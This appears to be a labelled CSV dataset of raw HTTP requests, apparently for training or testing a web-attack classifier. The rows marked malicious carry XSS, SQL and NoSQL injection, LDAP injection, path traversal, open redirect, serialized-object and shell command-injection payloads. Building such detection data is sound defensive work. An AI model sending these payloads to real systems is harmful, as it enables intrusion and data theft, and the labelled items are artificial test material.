label,text
malicious,"GET /account/view/<ImG SrC=x OnErRoR=prompt(document.domain)> HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
benign,"POST /api/v1/reviews HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: python-requests/2.28.1
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Authorization: Bearer mF_9.B5f-4.1JqM
Content-Length: 95
Connection: keep-alive
X-Forwarded-For: 192.168.1.15

product_id=3421&user_id=9827&rating=5&comments=VGhpcyBwcm9kdWN0IGV4Y2VlZHMgdGhlIGNoYXJ0LCB2ZXJ5IGhlbHBmdWwsIHlvdXIgbW9uZXkgc3RhcnMu"
benign,"POST /api/v2/review/new HTTP/1.1
Host: urban-shoehub.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 127
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Cookie: sessionid=d3e2a90f39b921ac7a8b

product_id=11247&user_id=58762&rating=4&review=SGVsbG8sIHNsdXBidWxseSBsaWtlZCB0aGUgcHJvZHVjdCBoYXMgeW91ciBzdG9yZS4gU3RhYmlsaXR5IGlzIGZzdCBob3BlLg=="
benign,"GET /ecommerce/cart/view?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNDgyMTMiLCJpYXQiOjE2ODIwODUwMDAsImV4cCI6MTY4MjA4ODYwMH0.-mVcIcz-aEAMreOZja-XAqLhKwP9GseERh7MG6k5g_Y HTTP/1.1
Host: online-retail-store.biz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: keep-alive
Accept-Language: en-US,en;q=0.7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Safari/537.36
Referer: https://online-retail-store.biz/products/electronics/tv/details"
benign,"POST /session/destroy HTTP/1.1
Host: api.cloud-data-services.ai
Connection: close
Content-Type: application/x-www-form-urlencoded
Referer: https://api.cloud-data-services.ai/user/profile
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Cookie: auth_session=3fa84814c7b270c5ff881490
Accept-Encoding: gzip, deflate, br
Accept: text/html
Content-Length: 38

csrf_token=21b0e29f5a57bd79c94f027c68ab0f4a"
benign,"GET /robots.txt HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Accept: text/plain, */*
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /resource/load?path=static/v2/js/utils.js HTTP/1.1
Host: code-crafters-hub.dev
Accept: application/javascript, */*;q=0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Safari/537.36
Referer: https://code-crafters-hub.dev/editor
Sec-Fetch-Dest: script
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Connection: keep-alive"
malicious,"GET /catalog/product?prod_code=758%27%20UNION%20SELECT%20%40%40VERSION%2C%20SLEEP%285%29%2C%20USER%28%29--%20 HTTP/1.1
Host: ultimate-outdoors-supply.com
Connection: keep-alive
Accept: text/html,application/xhtml+xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Cookie: sessionid=897563b952548e81f8b7feb712c4b631; color_mode=night"
benign,"GET /videos/search?query=outdoor+""yoga+session""+for+beginners&duration=30+minutes HTTP/1.1
Host: wellness-streams.tv
Accept: text/html
Accept-Language: en;q=0.9
Referer: https://wellness-streams.tv/homepage
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"HEAD /api/v1/check/status HTTP/1.1
Host: api.smart-home-hub.net
User-Agent: HTTPie/2.6.0
Accept-Encoding: gzip, deflate
Pragma: no-cache
Connection: keep-alive"
benign,"GET /assets/js/main.9f7c3a2e.js HTTP/1.1
Host: online-retail-store.biz
Accept: */*
Referer: https://online-retail-store.biz/products/electronics/laptops
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5 Build/SQ3A.220705.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.134 Mobile Safari/537.36
Connection: keep-alive"
malicious,"GET /redirect?returnTo=http%3A%2F%2Fsafe-login.net%40malicious-redirector.org%2Fuser HTTP/1.1
Host: safe-login.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"POST /api/v1/team/messages HTTP/1.1
Host: collaboration-portal.io
Content-Type: application/json
Accept: application/json
Content-Length: 43
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.124 Safari/537.36
X-Forwarded-For: 105.167.38.14

{""UNION ALL"": ""happy to join the meeting""}"
benign,"GET /js/vendor/jquery.min.js HTTP/1.1
Host: city-guide-hub.net
Accept: */*
Connection: close
Referer: https://city-guide-hub.net/events/summer-festival
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
benign,"GET /images/logo.svg HTTP/1.1
Host: digital-marketing-insights.io
User-Agent: python-requests/2.28.2
Accept: image/svg+xml,image/*,*/*;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"OPTIONS /api/v1/feedback/5600 HTTP/1.1
Host: user-feedback.serviceplatform.io
Origin: https://app.feedback-hub.dev
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: python-requests/2.28.2
Accept: */*
Connection: close"
malicious,"GET /api/users/lookup?email=jsmith%40securemail.shop&token%5B%24regex%5D=%5Eadm.* HTTP/1.1
Host: securemail.shop
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html
Accept-Encoding: gzip, deflate, br
Referer: https://securemail.shop/login
Connection: close"
benign,"POST /api/accounts HTTP/1.1
Host: smart-healthcare-solutions.io
Content-Type: application/json
Accept: application/json
Origin: https://smart-healthcare-solutions.io
X-Requested-With: XMLHttpRequest
User-Agent: curl/7.87.0
Connection: keep-alive
Content-Length: 164

{""email"":""nathan.blake@smart-healthcare-solutions.io"",""password"":""HealthyDays24"",""firstName"":""Nathan"",""lastName"":""Blake"",""consentToDataPolicy"":true}"
benign,"POST /upload/gallery/multi HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Content-Type: multipart/form-data; boundary=---ForumUpload101
Content-Length: 1997
Referer: https://community.game-dev-forum.org/gallery/upload
Connection: keep-alive
Cookie: user_session=gh238ls083hs9

---ForumUpload101
Content-Disposition: form-data; name=""images[]""; filename=""sprite_sheet.png""
Content-Type: image/png

(binary data png)
---ForumUpload101
Content-Disposition: form-data; name=""images[]""; filename=""concept_art.jpeg""
Content-Type: image/jpeg

(binary data jpeg)
---ForumUpload101
Content-Disposition: form-data; name=""images[]""; filename=""level_map.svg""
Content-Type: image/svg+xml

(binary data svg)
---ForumUpload101--"
benign,"GET /products;category=books/featured HTTP/1.1
Host: booksculptors.info
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html
Accept-Language: en-US,en;q=0.9
If-None-Match: ""a4fecd3f2"" 
Connection: keep-alive"
benign,"POST /api/v1/preferences/save HTTP/1.1
Host: settings.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 435
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36
Accept: application/json, text/plain, */*
X-Forwarded-For: 203.0.113.45
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

language=en-US&timezone=Asia%2FSingapore&notifications_email=true&notifications_sms=false&dark_mode=true&auto_sync=true&backup_frequency=daily&data_retention=180&security_level=high&password_policy=strict&session_timeout=30&enable_beta_features=false&preferred_regions=us-west-1%2Cus-east-2&api_access_level=full&email_verified=true&two_factor_auth=true&favorite_services=cloud_storage%2Ccompute%2Cdatabases&default_vm_size=medium&data_encryption=enabled&custom_dashboard_url=https%3A%2F%2Fdashboard.cloud-data-services.ai%2Fuser%2F1234&max_projects=10"
benign,"GET /blog/post/2023/11/30/how-to-grow-organic-vegetables HTTP/1.1
Host: green-thumb-gardens.info
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip
Accept-Language: en-US,en;q=0.9
Connection: close"
benign,"GET /tech/reviews/2024-ultra-laptop HTTP/1.1
Host: tech-insights-review.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/xml, text/xml
Referer: https://tech-insights-review.ai/
Cache-Control: max-age=3600
Connection: keep-alive"
benign,"GET /reports/financial/quarterly?code=%4a%5b%6C%7d&format=pdf HTTP/1.1
Host: analytics-suite-online.biz
User-Agent: Python-urllib/3.11
Accept: application/pdf
Accept-Encoding: identity
Via: 1.1 proxy.analytics-suite-online.biz
Connection: close"
benign,"HEAD /v2/health/check HTTP/1.1
Host: data-stream-proxy.net
User-Agent: curl/7.79.1
Accept: */*
Cache-Control: no-cache"
malicious,"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_filter=(uid=attacker%00"
benign,"PUT /v2/users/12345/settings HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer abcdefghijklmnopqrstuvwxyz1234567890
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Content-Length: 108
Connection: close

{""displayName"": ""Sarah L."", ""timezone"": ""America/Los_Angeles"", ""role"": ""user"", ""notifications"": {""email"": true, ""sms"": false}}"
malicious,"GET /public/assets/..%2F..%2Fconf%2Fsettings.ini HTTP/1.1
Host: fileshare-mediahub.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: https://fileshare-mediahub.io/gallery/view"
benign,"POST /api/v1/auth/login HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Accept: application/json
Origin: https://secure-user-portal.net
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 72

{""username"":""clare.hendrix"",""password"":""huntingtonPark89""}"
benign,"GET /robots.txt HTTP/1.1
Host: online-photography-gallery.org
User-Agent: bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Encoding: gzip
Via: 1.1 vegur
Connection: close"
benign,"OPTIONS /api/public/events/list HTTP/1.1
Host: event-management.services
Origin: https://app.social-networking-site.net
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Accept, Content-Type
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept: application/json
Connection: keep-alive"
malicious,"POST /services/configure HTTP/1.1
Host: object-bridge.net
Content-Type: text/xml; charset=utf-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
SOAPAction: ""http://object-bridge.net/configure""

<?xml version=""1.0"" encoding=""UTF-8""?>
<data>
  <serializedObject><![CDATA[AAEAAAD/////AQAAABZTeXN0ZW0uQ29uZmlndXJhdGlvbi5JbnN0YWxsLkFzc2VtYmx5SW5zdGFsbGVyAQAAAAdTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgIAAAADU3RhcnQAAAGUAAAATWV0aG9kQ3Vyc3NvclBhcnRhIjo7aGlkZGVuADw+]]></serializedObject>
</data>"
malicious,"PUT /api/v1/settings/update HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 120
Accept: application/json
X-CSRF-Token: 87291cc7802f42499881155ad3a6a893
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36

{""user"": ""samwise"", ""profileDesc"": ""Admin panel access' AnD SeLeCt 1 FrOm users WhErE 'a'='a""}"
benign,"GET /search?q=how%20to%20bake%20bread&lang=en-US HTTP/1.1
Host: www.bakecraftingsupplies.com
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
benign,"GET /community/forums/thread/98765?page=2 HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Connection: keep-alive
Referer: https://community.game-dev-forum.org/community/forums/"
benign,"POST /api/v2/survey/submit HTTP/1.1
Host: insights.market-analytics.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 186
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive

respondent_id=839217&feedback=%3Csuggestion%3EOffer+more+webinars+on+data+visualization.%3C%2Fsuggestion%3E&satisfied=true"
benign,"PUT /users/4532/profile-picture HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer NjAxMjM0NTZBQkNERUZH
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
X-CSRF-Token: e9a3d45f8bf923c122d56a9a43123dd7
Content-Length: 198
Connection: keep-alive

{""userId"":4532,""avatar_thumbnail_b64"":""iVBORw0KGgoAAAANSUhEUgAAAC8AAAA8CAYAAAA33FmfAAAAAXNSR0IArs4c6QAAAIRlWElmTU0AKgAAAAgABwESAAMAAAABAAEAAIdpAAQAAAABAAABEqAAAAAAAAABaAAAAAADW6hJrAAABFUlEQVRYw+3XwQ2AIAwF0P//P2llMyOE7AQKuF46ZCq6Q6yDm0+74HxAICLB7nDdeekWyASC1jUKPYZKZTEBcGUMT/TjyAlEa6rbKVbq98/1weBy2x0FkANRMUIVprB3pmKjnDHphgDBrK87ftY6/wD0q8ntAYt7kLgAEv7PRxR6CNQ2DQwgAAQUFE1NU0rMkhIIHwZAAeMbQBAQEEO0Nb5AFkJDhCSAQISLtFvpJaRVF3fpM1o8EX0UXfKiI9rQIgZrpvqlauka6okjpS032qUklwqEf6fIUT7Dw1HTy6JgAAAABJRU5ErkJggg==""}"
malicious,"GET /tools/trace-route?destination=172.217.10.46;%20id HTTP/1.1
Host: dev-tools-kit.org
User-Agent: Python-urllib/3.9
Accept-Encoding: gzip, deflate
Accept-Charset: utf-8, iso-8859-1;q=0.5
Connection: close"
benign,"GET /account/settings/profile HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Cookie: user_prefs_b64=eyJ1c2VyTGFuZyI6ImVuIiwicmVkaXJlY3RTZXR0aW5ncyI6dHJ1ZX0=; auth_sid=Xg72m94nqQcF
User-Agent: curl/7.88.1"
benign,"GET /browse/electronics/tvs?filter[color]=black&filter[screen_size]=55&sort_by=price_asc&page=2 HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.8
Referer: https://online-retail-store.biz/electronics
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /stylesheets/dark-theme.css HTTP/1.1
Host: vintage-cars-resources.info
User-Agent: Java/11.0.12
Accept: text/css,*/*;q=0.1
Cache-Control: no-cache
Connection: keep-alive"
malicious,"GET /config/load?path=..%c0%af..%c0%af..%c0%afapache%c0%aflogs%c0%aferror.log HTTP/1.1
Host: web-services-suite.net
User-Agent: Python-urllib/3.9
Accept-Encoding: identity
Accept-Charset: utf-8, iso-8859-1;q=0.5
Connection: close"
benign,"GET /forum/topics?query=how%20to%20bake%20bread HTTP/1.1
Host: community-kitchen-talk.net
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.8
Referer: https://community-kitchen-talk.net/
Connection: keep-alive
Cookie: sessionId=2b1f9a87c7214d3b8c756572;"
benign,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer 48ffab7a9d3a4db9aead4349bf814a2c
Content-Type: application/json
Idempotency-Key: 54c8b5a5-431a-4acb-bbdf-948a752f8c54
X-Request-ID: 9a4a3d29-138a-4f19-8a0e-f4e22a6ed3b3
Accept-Language: en-US,en;q=0.9
User-Agent: python-requests/2.27.1
X-Client-Version: 3.2.7

{""query"":""wireless earbuds"",""filters"":{""priceRange"":{""min"":50,""max"":150},""inStock"":true}}"
benign,"POST /api/v2/cart/add-item HTTP/1.1
Host: checkout-online-retail.biz
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Accept: application/json, text/javascript, */*; q=0.01
Referer: https://checkout-online-retail.biz/products/electronics/headphones/details
Content-Length: 48
Cookie: cartid=70f4e269f659a276; csrf_token=99e4b47dffedcf6f

product_id=5231&quantity=2&variant=color:black"
benign,"PUT /members/8721/details HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Type: application/json
Accept-Encoding: gzip, deflate
Referer: https://community.game-dev-forum.org/dashboard
Content-Length: 110
Cookie: user_session=YL7mZ8vwPjC3HbEpR5Q2xTW;

{""bio"": ""Passionate about &lt;i&gt;game design&lt;/i&gt;, &lt;script&gt;tags&lt;/script&gt; escaped properly."", ""hobbies"": [""level design"", ""sprite art""]}"
benign,"POST /newsletter/signup HTTP/1.1
Host: theculturebuzz.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-us
Referer: https://theculturebuzz.info/home
Connection: keep-alive

email=laura.o%27connor%40theculturebuzz.info"
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: GameClient/5.6 `cat /etc/hostname`
Content-Type: application/json
Accept: application/json, text/javascript
Content-Length: 47
X-Requested-With: XMLHttpRequest
Cookie: auth_token=2b7e9f1c5d3a4b6f

{""notifyEmail"":true,""theme"":""dark"",""lang"":""en""}"
